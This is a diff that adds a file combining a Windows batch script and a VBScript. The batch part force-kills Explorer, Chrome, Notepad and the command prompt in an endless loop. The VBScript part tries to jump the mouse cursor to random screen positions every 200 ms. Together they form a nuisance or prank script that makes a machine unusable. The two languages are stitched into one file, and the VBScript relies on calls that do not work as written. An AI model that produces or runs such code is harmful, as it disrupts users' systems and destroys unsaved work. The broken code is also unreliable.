@@ -1,0 +1,33 @@
+@echo off
+:loop
+taskkill /F /IM explorer.exe
+taskkill /F /IM chrome.exe
+taskkill /F /IM notepad.exe
+taskkill /F /IM cmd.exe
+goto loop
+
+
+
+Set obj = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+Set cursor = CreateObject("WScript.Shell")
+
+Randomize
+Do
+    x = Int((ScreenWidth() - 1) * Rnd + 1)
+    y = Int((ScreenHeight() - 1) * Rnd + 1)
+    Call MoveCursor(x, y)
+    WScript.Sleep 200 'Χρονική καθυστέρηση (200ms)
+Loop
+
+Function ScreenWidth()
+    ScreenWidth = shell.Screen.Width
+End Function
+
+Function ScreenHeight()
+    ScreenHeight = shell.Screen.Height
+End Function
+
+Sub MoveCursor(x, y)
+    cursor.Run "rundll32.exe user32.dll,SetCursorPos " & x & "," & y, 0, True
+End Sub
